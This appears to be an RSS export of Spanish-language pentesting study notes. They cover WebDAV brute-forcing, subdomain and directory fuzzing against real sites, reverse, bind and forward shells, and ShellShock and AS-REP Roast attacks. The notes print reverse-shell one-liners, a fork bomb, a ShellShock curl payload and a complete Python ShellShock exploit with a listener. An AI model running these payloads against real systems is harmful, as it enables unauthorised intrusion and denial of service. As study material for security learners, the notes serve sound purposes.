<br>Tags: <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> 
<br><br><br>WebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite a los usuarios acceder y manipular arachivos en un servidor web a través de una conexción segura.<br>Cuando hablamos de enumerar un servidor WebDAV, a lo que nos referimos es al proceso de recopilar información sobre los recursos dispobilbles en el servidor WebDAV. Los atacantes pueden utilizar herramientas de enumeración de webDAV para buscar recursos protegidos en el servidor, como archviso de configuración, contraseñas y otros datos confidenciales. Los atacantes pueden utilizar la información recopilada surante la enumeración para planificar ataques más sofisticados contra el servidor. <br><br><br>En la fase inicial de reconocimiento, se implica el intentar identificar las extensiones de archivo permitidas en el servidor. Una vez detectadas las extensiones de archivo permitiddas, los atacantes pueden aprovecharse de esto para cargar y ejecutar archivos que contengan código malicioso. Si los archivos maliciosos se cargan y ejecutan con éxito en el servidor web, los atacantes pueden obtener acceso no autorizado al sercidor y comprometer la seguridad del sistema. <br>Una de las <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> a usar es Davtest, la cual es una herramienta de línea de comandos que se utiliza para realizar pruebas de penetración en servidores WebDAV. Esta puede utilizarse para enumerar recursos protegidos en un servidor WebDAV, así com para probar la configuración de seguridad del servidor. Por ultimo, también puede utilizarse para probar la autenticación y la autorización del servidor, y para detectar vulnerabilidades conocidas. <br>Otra de las <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> a usar es Cadaver, la cual es una herramineta de línea de comandos que se utiliza para interactuar con servidores WebDAV. Permite a los usuarios navegar por los recursos del servidor, cargar y descargar archivos, y ejecutar comandos en el servidor. También puede utilizarse para realizar pruebas de penetración en servidores WebDAV, como la enumeración de recursos protegidos y la explotación de vulnerabilidades conocidas. <br><br><br>Para  prevenir la enumeración y explotación de WebDAV, es importante que los administradores de sistemas implementen medidas de seguridad adecuadas en el servidor. Esto puede incluir la limitación de los recursos disponibles en el servidor y la utilización de autenticación y autorización fuertes. Además, es importante que los usuarios protejan sus contraseñas y eviten el uso de contraseñas débiles o fáciles de adivinar. <br><br><br>Para explotar un WebDAV lo primero que habría que hacer es conseguir credenciales validas, una vez con credenciales podríamos comenzar a utilizar las <a data-href="Tools" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html" class="internal-link" target="_self" rel="noopener nofollow">Tools</a> Cadaver y Davtest mencionadas anteriormente. <br>Podriamos utilizar la herramienta Davtest para verificar las credenciales validas del WebDAV mediante un oneliner...<br>cat /usr/share/wordlists/rockyou.txt | while real password; do response=$(davtest -url http://{ip} -auth {user}:$password 2&gt;&amp;1 | grep -i succeed); if [ $response ]; then echo "[!] The correct password is $password"; break; fi; done
Copy<br>Una vez realizado esto, en caso de encontrar la password correcta, se habrian realizado varias pruebas de subida de archivos y demás, ahora con la herramienta Cadaver y el panel de ayuda help podremos ver el contenido de la WebDAV, subir archivos, crear carpetas, movernos entre la estructura, etc. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/enumeración-y-explotación-de-webdav.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Enumeración y explotación de WebDAV.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 10 Jun 2024 13:13:05 GMT</pubDate></item><item><title><![CDATA[Busqueda de mails para una empresa o dominio:]]></title><description><![CDATA[ 
 <br><br><br>Existen páginas las cuales sirven para buscar mails relacionados a un dominio o a una compañia, algunas de ellas son:<br>
<br>


<br>


<br>


<br>O extenciones para chrome como clearbit<br>
<a rel="noopener nofollow" class="external-link" href="https://chrome.google.com/webstore/detail/clearbit-connect-free-ver/pmnhcgfcafcnkbengdcanjablaabjplo" target="_blank">https://chrome.google.com/webstore/detail/clearbit-connect-free-ver/pmnhcgfcafcnkbengdcanjablaabjplo</a><br>Y por supuesto, páginas para verificar si el correo dado sigue en uso.<br>
<br>


<br>


<br><br>
<br>


<br>


<br>


<br>


<br><br><br>
<br>


<br>


<br>


<br>


<br># Realizar un atauqe de fuerza bruta a una url para descrubrir subdominios 
gobuser vhost -t 500 -w /usr/share/SecLlists/Discovery/DNS/subdomains-top1million-5000.txt -u https://tinder.com --append-domain
Copy<br>
<br>


<br>


<br>wfuzz -c -t 20 -w /usr/share/SecLlists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.tinder.com" https://tinder.com 
Copy<br>
<br>


<br>


<br>python3 sublister.py -d tinder.com
Copy<br><br><br>
<br>


<br><br><br>
<br>


<br>


<br>


<br><br>En este caso, como previamente hemos enumerado los subdominios, ahora tocan las rutas y recursos.<br><br># Ataque de fuerza bruta a la url http://miwifi.com ocultando los status code 404 y 403 
gobuster dir -t 20 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://miwifi.com --add-slash -b 404,403 

# Fuzzing a la url http://miwifi.com agregando a la white list (-s) solo el status 200, poniendo el la black list (-b) un '' para evitar errores, buscando por extenciones .php, .html y .txt, siguiendo el redirect de los status code 301 (-r)
gobuser dir -t 20 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://miwifi.com -s 200 -b '' -x php,html,txt -r
Copy<br><br># Fuzzing a la url http://miwifi.com ocultando el code 404 y 403, en formato color, con 200 threads. 
wfuzz -c -t 200 --hc=404,403 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://miwifi.com/FUZZ

# Agregando una barra a la url, las respuestas 301 las cuales redirigen, las sigue por lo que lista el status 200
wfuzz -c -t 200 --hc=404,403 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://miwifi.com/FUZZ/

# Se pueden ocultar lineas (lenght) --hl=x o mostrar solo respuestas con un length especifico --sl=x, tambien palabras, --hw, --sw 

# El parametro -z sirve par aindicar un payload, en este caso es lo mismo que poner -w, estamons indicando que es un payload de tipo file
wfuzz -c --hc=404,403 -t 200 -z file,/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://miwifi.com/FUZZ/

# Pero esto se puede usar para probar multiples extensiones de archivo como .php, .html, .txt, etc (Por ejemplo). Por cada payload ingresado con -z, se hace alución con la palabra FUZZ pero con el número del payload ingresado, si ingresadomos solo uno aparte del diccionario, el diccionario se haria alución como FUZZ y el payload ingresado con -z que seria el segundo payload con FUZ2Z, si ingresaramos otro payload con FUZ3Z y asi susesivamente
wfuzz -c --hc=404,403 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-html-txt http://miwifi.com/FUZZ.FUZ2Z

# Otro ejemplo 
wfuzz -c -t 200 --hc=404,403 -z range,1-20000 'http://www.mi.com/shop/buy/detail?product_id=FUZZ'

Copy<br><br>
<br>


<br># ffuf es un script en go muy similar a wfuzz pero más rapido
ffuf -c -t 200 --mc=200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://miwifi.com/FUZZ/
Copy<br><br><br><br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br><br>Todo esto pertenece a la fase de reconocimiento, pero una vez que ganemos acceso al sistema con algun concepto de <a data-href="Shells" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html" class="internal-link" target="_self" rel="noopener nofollow">Shells</a> aplicado, podriamos hablar de enumeración o <a data-href="System reconnaissance" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/system-reconnaissance.html" class="internal-link" target="_self" rel="noopener nofollow">System reconnaissance</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/fase-de-reconocimiento.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Fase de Reconocimiento.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 21 Aug 2024 22:34:08 GMT</pubDate></item><item><title><![CDATA[Payloads]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:ataques" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataques</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:ataques" class="tag" target="_blank" rel="noopener nofollow">#ataques</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a>  <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>Es un tipo de payload que se divide en dos o más etapas. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura. <br><br><br>Es un tipo de payload qu se envía como una sola entidad y no se dividie en múltiples etapas. La carga útil comleta se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero tamibién es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/payloads.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Explotation Concepts/Payloads.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Feb 2024 23:17:03 GMT</pubDate></item><item><title><![CDATA[Shells]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:explotación" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#explotación</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:explotación" class="tag" target="_blank" rel="noopener nofollow">#explotación</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a>
<br><br><br>Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, premitiéndole tomar el control de la máquina remota. <br>En el ejemplo de la imagen, supongamos que la maquina victima tiene expuesto un puerto :80, con un servicio de apache2, el cual, es vulnerable a RCE (Remote Code Execution), una vez pudiendo ejecutar comandos como la maquina victima, al atacante le interesaria enviarse una consola interactiva por un puerto que el decida.<br><img alt="reverseShell.png" src="https://dobliuw.com/lib/media/reverseshell.png" style="width: 1000px; max-width: 100%;"><br>Algunos oneliners típicos para lograr esto son:<br>
<br>


<br>ncat -e /bin/bash {IP_atacante} {puerto}
Copy<br>
<br>


<br>bash -i &gt;&amp; /dev/tcp/{IP_atacante}/{puerto} 0&gt;&amp;1 
Copy<br>
<br>


<br>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.38",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
Copy<br><br><br><br>Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante por ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma. <br>En este caso, en el ejemplo de la imagen, el atacante al explotar el RCE, inyecta un comando malicioso, en este ejemplo nc -nlvp 443 -e /bin/bash que lo que hace es escuchar en el puerto 443 por conexiones, y cuando reciba una, otorgara la consola interactiva.<br><img alt="BindShell.png" src="https://dobliuw.com/lib/media/bindshell.png" style="width: 1000px; max-width: 100%;"><br><br><br>Esta técnica puede llegar aser utilizada cuando no se pueden establecer conexiones Reverse o Bind debido a posibles reglas de Firewall implementadas en la red u otro tipo de limitaciones. Esto podría lograrse haciendo uso de <a data-href="Named and Unnamed Pipes" href="https://dobliuw.com/notes/3.-system/global-concepts/named-pipes/named-and-unnamed-pipes.html" class="internal-link" target="_self" rel="noopener nofollow">Named and Unnamed Pipes</a> (Named Pipes), creando un archivo FIFO el cual recibirá constantemente los comandos que querramos ejecutar y enviará el output de los mimos a un archivo alojado en un determinado path. De esta manera, abusando del concepto que trae los pipes y la comunicación bidireccional. <br>Creando un Named Pipe llamado input, el cual estaremos filtrando sus últimas líneas para reenviarlas a un archivo llamado output:<br>mkfifo /tmp/input; tail -f /tmp/input | /bin/bash 2&gt;&amp;1 &gt; /tmp/output 
Copy<br>De esta manera, el ejecutar este comando veríamos que el mismo se queda en ejecución y en el directorio /tmp se crearía un archivo FIFO con el nombre input, la ídea es una vez llegado a este punto, envíar los comandos que deseemos ejecutar para que los mismos sean interpretados por un unamed pipe ( | ) y ejecutados por una /bin/bash transformando el stderr a stdout yr alojadar el output de estos comandos en el archivo output. <br>echo "whoami" &gt; /tmp/input
echo "script /dev/null -c bash" &gt; /tmp/input
echo "id" &gt; /tmp/input

cat /tmp/output
# ──────┬───────────────────────────
#       │ File: /tmp/output
# ──────┼────────────────────────
#   1   │ kali    
#   2   │ Script started, output log file is '/dev/null'.
#   3   │ id
#   4   │ kali@kali: /tmp^G┌──(kali㉿kali)-[/tmp]
#   5   │ └─$ id
#   6   │ ^Muid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),106(bluetooth),113(s
#       │ canner),135(wireshark),137(kaboxer)
#   7   │ 
#   8   │ ali@kali: /tmp^G┌──(kali㉿kali)-[/tmp]
#   9   │ └─$ 
# ──────┴────────────────────────────────────────────────────
Copy<br> En el archivo /etc/output podemos ver en la línea 1, el output del comando whoami, el la línea 2 el lanzamiento de la pseudo consola como indicamos en el segundo comando (script /dev/null -c bash), en la línea 4 podemos ver la pseudo consola con el comando que indicamos y recien en la línea 6 podemos ver la ejecución del comando id que envíamos.<br>De igual manera existen herramientas como <a data-tooltip-position="top" aria-label="https://github.com/Dobliuw/MyHackingTools/blob/master/forward_shell.py" rel="noopener nofollow" class="external-link" href="https://github.com/Dobliuw/MyHackingTools/blob/master/forward_shell.py" target="_blank">forward_shell.py</a> las cuales se encargan de explotar esta técnica para escenarios en donde dispongamos de una web vulnerable con <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>, permitiendonos de esta manera convertir una web shell en una "terminal interactiva" simulada haciendo uso de <a data-href="Named and Unnamed Pipes" href="https://dobliuw.com/notes/3.-system/global-concepts/named-pipes/named-and-unnamed-pipes.html" class="internal-link" target="_self" rel="noopener nofollow">Named and Unnamed Pipes</a>. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Explotation Concepts/Shells.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 05 Feb 2024 19:47:40 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/reverseshell.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/reverseshell.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[System reconnaissance]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> <a class="tag" href="https://dobliuw.com/?query=tag:linux" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#linux</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> <a href="https://dobliuw.com?query=tag:linux" class="tag" target="_blank" rel="noopener nofollow">#linux</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a>
<br><br><br>Cuando hablamos de reconocimiento a nivel de sistema nos referimos al proceso post explotación, una vez aplicado la debida <a data-href="Fase de Reconocimiento" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/fase-de-reconocimiento.html" class="internal-link" target="_self" rel="noopener nofollow">Fase de Reconocimiento</a>, haber encontrado alguna vulnerabilidad y habiendola explotado con algun concepto de <a data-href="Shells" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/shells.html" class="internal-link" target="_self" rel="noopener nofollow">Shells</a> y obtenido acceso al sistema, nos encontramos con esta "segunda" fase de reconocimiento, esta vez a nivel de sistema.<br>
La enumeración es un proceso crítico para identificar por ejemplo vías potenciales de poder elevar nuestros privilegios de usuarios, así como para comprender la estructura del sistema objetivo y encontrar información útil para futuros ataques. <br><br>
<br>


<br>

Es una herramienta de enumeración para sistemas Linux que permite a los atacantes obtener información detallada sobre la configuración del sistema, los servicios en ejecución y los permisos de archivos.

<br>

Otra herramienta de enumeración para sistemas Linux la cual permite a los atacantes obtener información sobre el sistema.

<br>

Es una herramienta de enumeración de procesos que permite a los atacantes observar los procesos y comandos que se ejecutan en el sistema objetivo a intervalos regulares de tiempo.

<br>

Es una herramienta de enumeración de Linux muy poderosa la cual permite a los atacantes obtener información  sobre archivo de configuración, base de datos, sudoers, posibles vulnerabilidades, posibles paths para escalada de privilegios, procesos del sistema, tareas cron, etc. 

<br>

De más esta decir que obviamente uno puede realizar todos estros procesos de enumeración de manera manual, esto se puede ver en la parte de <a data-href="Pentesting/Sistemas/Sistemas Operativos/Linux/Enumeración" href="https://dobliuw.com/Pentesting/Sistemas/Sistemas Operativos/Linux/Enumeración" class="internal-link" target="_self" rel="noopener nofollow">Pentesting/Sistemas/Sistemas Operativos/Linux/Enumeración</a>

<br>Script manual:<br>#!/bin/bash 

# Ctrl + c

function ctrl_c(){
	echo -e "\ņ\n\t[!] Quiting...\n\n"
	tput cnorm; exit 1 
}

trap ctrl_c SIGINT 


old_process=$(ps -eo user,command)

tput civis 

while true; do 
	new_process=$(ps -eo user,command)
	diff &lt;(echo "$old_process") &lt;(echo "$new_process") | grep "[\&gt;\&lt;]" | grep -vE "kworker|procmon|command" 
	old_process=$new_process 
done 

Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/system-reconnaissance.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Explotation Concepts/System reconnaissance.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Feb 2024 23:20:57 GMT</pubDate></item><item><title><![CDATA[Type of explotation]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:ataque" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ataque</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:ataque" class="tag" target="_blank" rel="noopener nofollow">#ataque</a> 
<br><br><br>Es un tipo de explotación que se realiza de manera manual y requiere que el atacante tenga un conocimiento profundo del sistema y sus vulnerabilidades. En este enfoque, el atacante utiliza herramientas y técnicas específicas para identificar y explotar vulnerabilidades en un sistema objetivo. Este enfoque es más lento y requiere más esfuerzo y habilidad por parte del atacante, pero también es más preciso y permite un mayor control sobre el proceso de expolotación. <br><br><br>Es un tipo de explotación que se realiza automáticamente mediante el uso de herramientas automatizadas, como scrips o programas diseñados específicamente para identificar y explotar vulnerabilidades en un sistema objetivo. Este enfoque es más rápido y menos laborioso que el enfoque manual, pero también puede ser menos preciso y puede generar más ruido en la red objetivo, lo que aumenta el riesgo de detección.  <br>Ejemplos de herramientas que sirven para explotación automatizada son SQLMap, Metasploit, etc.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/explotation-concepts/type-of-explotation.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Explotation Concepts/Type of explotation.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Feb 2024 23:21:06 GMT</pubDate></item><item><title><![CDATA[¿ Que es un <strong>ataque ShellShock</strong> ?]]></title><description><![CDATA[ 
 <br><br>Un ataque ShellShock es un tipo de ataque informático que aprovecha una vulnerabilidad en el intérprete de comandos bash en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática. <br>Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar porgramas maliciosos, etc. <br>La vulnerabilidad ShellShock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de Shell. El problema radica en la forma en que Bahs maneja las variable de entorno. Los atacantes pueden inyectar código malicoso en estas variables de entorno, las cuales Bash ejecuta sin cuestion su origin o contenido. <br>Los atacantes pueden explotar estas vulnerabilidades a través de diferentes vectores de atauqe. Uno de ellos es a través del User-Agent, que es la información que el navegador web envía al servidor web para indentifcar el tipo de navegador y sistema operativo qu está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.<br><br><br>Para explotar un ShellShock Attack, es importante tener en cuenta que para saber si este es vulnerable, es necesario probarlo, asi como tener en cuenta que este funciona para viejas versiones de bash. <br>Existen <a data-tooltip-position="top" aria-label="https://blog.cloudflare.com/inside-shellshock/" rel="noopener nofollow" class="external-link" href="https://blog.cloudflare.com/inside-shellshock/" target="_blank">páginas webs</a> que enseñan a explotar dicha vulnerabilidad, esto suele ser posible a traves del User-Agent el cual recibe como valor un payload con la sig. estructura: () { :; }; echo; &lt;commando_to_execute&gt;. Este payload es simpilar al del <a data-tooltip-position="top" aria-label="https://en.wikipedia.org/wiki/Fork_bomb" rel="noopener nofollow" class="external-link" href="https://en.wikipedia.org/wiki/Fork_bomb" target="_blank">Fork Bomb Attack</a> el cual es un ataque de denegación de servicio con la estructura de: <br>:(){:|:&amp;};:
# O 
fork(){
	fork | fork &amp;
}; 
fork 
Copy<br>Por lo que se podría tramitar una petición curl de la sig. manera, teniendo en cuenta que mediante gobuster se encontro por fuzzing la URL cig-bin, sabiendo que siempre que veamos una ruta como esta es importante probar un ShellShock Attack: <br># Es importante al descubrir un dir cgi-bin, buscar archivos con la extensión pl o sh o cgi. 
gobuster dir -u http://&lt;ip&gt;:&lt;port&gt;/cgi-bin --proxy http://&lt;proxy_ip&gt;:&lt;proxy_port&gt; -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi
Copy<br>curl --proxy http://&lt;proxy_ip&gt;:&lt;proxy_port&gt; -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i &amp;&gt;/dev/tcp/&lt;own_ip&gt;/&lt;port&gt; 0&gt;&amp;1'" "http://&lt;ip&gt;:&lt;port&gt;/cgi-bin/status"
Copy<br>Así mismo, podríamos crear un script en python para entablar una consola interactiva o mismo para ejecutar comandos <br>#!/usr/bin/python3 

import sys, signal, requests, threading
from pwn import * 

# Ctrl + c

def ctrl_c(sig, frame): 
    print("\n\n[!] Saliendo...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global vars 

url = "http://192.168.1.38/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.38:3128'}
lport = 443

# Bin 

def shell_shock(): #command 

    headers = {'User-Agent':'() { :; }; echo; /bin/bash -c "/bin/bash -i &amp;&gt;/dev/tcp/192.168.1.35/443 0&gt;&amp;1"'}
    #user_agent = {'User-Agent': '() { :; }; echo; %s' % (command)} 

    r = requests.get(url, headers=headers, proxies=squid_proxy)
    #print("\n\n\t(!) Output del comando: %s" % (r.text))

if __name__ == "__main__": 
    #command = input("Ingrese un comando a ejecutar: ")
    #shell_shock(command)
    try:
        threading.Thread(target=shell_shock, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("No se pudo establecer la conexión")
        sys.exit(1)
    else: 
        shell.interactive()
Copy<br>La libreria pwntools/pwn sirve para poder entablar una consola interactiva, entre otras cosas. Mientras que la libreria threading para ejecutar las cosas con hilos. <br><br><br><br><br><br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/0.-linux/shellshock.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/2. Explotation/Vulnerabilities/0. Linux/ShellShock.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:47:30 GMT</pubDate></item><item><title><![CDATA[AS-REP Roast]]></title><description><![CDATA[ 
 <br><br>Un ataque AS-REP Roast es un tipo de ataque de seguridad informático contra el protocolo Kerberos. Este ataque se acontece cuando uno de los Usuarios del Dominio tiene seteado el Atributo UF_DONT_REQ_PREAUTH lo que le permite solicitar un TGT a Kerberos (KDC) sin necesidad de proporcionar contraseña. En este mismo TGT se encuentra el Hash NTLMv2 del usuario en cuestion, que luego podriamos intentar crackear con fuerza bruta para obtener la contraseña del usuario.<br><br><br><br>Se puede dar el caso que auditando un sistema windows nos encontremos con el DC (Domain Controler) y con herramientas como <a data-tooltip-position="top" aria-label="https://github.com/ropnop/kerbrute" rel="noopener nofollow" class="external-link" href="https://github.com/ropnop/kerbrute" target="_blank">kerbrute</a> enumeremos una lista de usuarios potenciales devolviendonos está herramienta los usuarios válidos, de manera que nos encontramos con una lista de usuarios válidos, en este momento es donde podemos pensar en un AS-REP Roast para válidar si existen usuarios que tengan la opción UF_DONT_REQ_PREAUTH, donde, en caso de tenerla podríamos solicitar un TGT el cual nos otorgaría el hash NTLMv2 para intentar crackear. <br><br># Ver abajo de todo las opciones 
impacket-GetNPUsers.py 

# Una de las opciones (4) es para intentar obtener el TGT de una wordlist de usuarios
impacket-GetNPUsers.py {domain}/ -no-pass -usersfile {file.txt}
